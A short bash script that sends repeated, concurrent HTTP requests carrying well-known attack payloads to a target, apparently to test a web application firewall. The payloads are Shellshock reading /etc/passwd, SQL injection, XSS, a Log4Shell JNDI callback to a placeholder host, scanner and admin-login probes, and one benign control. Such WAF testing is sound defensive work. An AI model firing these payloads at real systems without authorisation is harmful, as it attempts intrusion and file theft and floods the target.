#!/bin/bash
TARGET="${TARGET:?Set TARGET env var, e.g. TARGET=https://your-waf-protected-host.example}"
COUNT="${COUNT:-100}"
echo "Firing ${COUNT}x each pattern against ${TARGET}"
for i in $(seq 1 $COUNT); do curl -s -o /dev/null -A "() { :;}; /bin/cat /etc/passwd" "$TARGET/?shellshock=$i" & done
for i in $(seq 1 $COUNT); do curl -s -o /dev/null "$TARGET/?id=1%27%20OR%20%271%27%3D%271&q=$i" & done
for i in $(seq 1 $COUNT); do curl -s -o /dev/null "$TARGET/?q=%3Cscript%3Ealert($i)%3C%2Fscript%3E" & done
for i in $(seq 1 $COUNT); do curl -s -o /dev/null -H "User-Agent: \${jndi:ldap://evil/$i}" "$TARGET/" & done
for i in $(seq 1 $COUNT); do curl -s -o /dev/null -A "curl/7.29.0" "$TARGET/?scan=$i" & done
for i in $(seq 1 $COUNT); do curl -s -o /dev/null "$TARGET/admin/login.php?try=$i" & done
for i in $(seq 1 $COUNT); do curl -s -o /dev/null "$TARGET/?legit=$i" & done
wait
echo "done — ~$((COUNT * 7)) requests fired"
